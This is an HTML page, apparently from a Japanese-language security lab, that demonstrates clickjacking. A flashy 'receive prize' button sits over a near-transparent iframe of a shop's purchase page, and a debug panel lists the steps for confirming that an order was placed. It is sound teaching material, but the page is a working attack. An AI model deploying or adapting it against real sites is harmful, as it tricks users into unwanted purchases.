<!doctype html>
<html lang="ja">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Attacker Site (Clickjacking Demo)</title>
    <style>
      :root { color-scheme: dark; }
      body {
        margin: 0;
        min-height: 100vh;
        font-family: Georgia, "Times New Roman", serif;
        background:
          radial-gradient(circle at top, rgba(255, 214, 10, 0.25), transparent 40%),
          linear-gradient(180deg, #2d1208 0%, #140b07 50%, #070707 100%);
        color: #fff9e6;
      }
      .shell {
        max-width: 980px;
        margin: 0 auto;
        padding: 48px 20px 72px;
      }
      .hero {
        position: relative;
        overflow: hidden;
        border-radius: 24px;
        border: 1px solid rgba(255, 220, 120, 0.25);
        background: linear-gradient(135deg, rgba(255, 244, 202, 0.12), rgba(255, 177, 66, 0.06));
        box-shadow: 0 24px 80px rgba(0, 0, 0, 0.45);
        padding: 36px;
      }
      .eyebrow {
        display: inline-block;
        padding: 6px 12px;
        border-radius: 999px;
        background: rgba(255, 208, 76, 0.18);
        color: #ffd977;
        letter-spacing: 0.1em;
        font-size: 12px;
      }
      h1 {
        margin: 16px 0 12px;
        font-size: clamp(36px, 7vw, 64px);
        line-height: 0.95;
      }
      .lead {
        max-width: 560px;
        margin: 0;
        color: #f2dfc5;
        font-size: 18px;
        line-height: 1.6;
      }
      .stage {
        position: relative;
        margin-top: 32px;
        width: min(100%, 580px);
        height: 220px;
      }
      .bait {
        position: absolute;
        inset: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 24px;
        background:
          linear-gradient(160deg, rgba(255, 255, 255, 0.18), rgba(255, 255, 255, 0.02)),
          linear-gradient(135deg, #ff8e2b, #ff3f34);
        color: #fffef6;
        font-size: 34px;
        font-weight: 700;
        letter-spacing: 0.06em;
        box-shadow: 0 18px 50px rgba(255, 80, 45, 0.35);
        text-shadow: 0 2px 14px rgba(0, 0, 0, 0.25);
      }
      .hint {
        position: absolute;
        left: 24px;
        right: 24px;
        bottom: 18px;
        color: rgba(255, 245, 214, 0.92);
        font-size: 14px;
      }
      .trap-frame {
        position: absolute;
        top: -202px;
        left: -1px;
        width: 640px;
        height: 560px;
        border: 0;
        opacity: 0.02;
      }
      .debug {
        margin-top: 28px;
        border-top: 1px solid rgba(255, 223, 145, 0.18);
        padding-top: 20px;
        color: #dcccb0;
        font-size: 14px;
      }
      code {
        background: rgba(255, 255, 255, 0.08);
        padding: 2px 6px;
        border-radius: 6px;
      }
      .steps {
        margin-top: 10px;
        padding-left: 18px;
      }
      .steps li {
        margin-bottom: 6px;
      }
      @media (max-width: 720px) {
        .hero {
          padding: 24px;
        }
        .stage {
          height: 180px;
        }
        .bait {
          font-size: 26px;
          text-align: center;
          padding: 0 24px;
        }
        .trap-frame {
          top: -218px;
          left: -54px;
          transform: scale(0.92);
          transform-origin: top left;
        }
      }
    </style>
  </head>
  <body>
    <main class="shell">
      <section class="hero">
        <span class="eyebrow">Clickjacking Demo</span>
        <h1>限定特典を受け取る</h1>
        <p class="lead">
          派手なボタンに見せかけつつ、背後では別サイトの購入ボタンを押させるデモです。被害者には正規の購入画面がほぼ見えません。
        </p>

        <div class="stage">
          <div class="bait" aria-hidden="true">景品を受け取る</div>
          <div class="hint">1回クリックすると、見えない iframe 上の購入ボタンが押されます。</div>
          <iframe
            class="trap-frame"
            id="trapFrame"
            title="hidden purchase frame"
            loading="eager"
          ></iframe>
        </div>

        <div class="debug">
          <p style="margin-top: 0;"><strong>【学習用デバッグ表示】</strong></p>
          <p>埋め込み先: <code id="targetPath"></code></p>
          <ol class="steps">
            <li>被害者として Shop にログインしておく</li>
            <li>このページで「景品を受け取る」位置をクリックする</li>
            <li>Shop の <code>/orders</code> を開いて注文追加を確認する</li>
          </ol>
        </div>
      </section>
    </main>

    <script>
      const clickjackingTarget =
        window.__CLICKJACKING_TARGET__ || new URL("/purchase/1", window.__TARGET_BASE__).toString();
      const frame = document.getElementById("trapFrame");
      const targetPath = document.getElementById("targetPath");
      if (frame) {
        frame.src = clickjackingTarget;
      }
      if (targetPath) {
        targetPath.textContent = clickjackingTarget;
      }
    </script>
  </body>
</html>
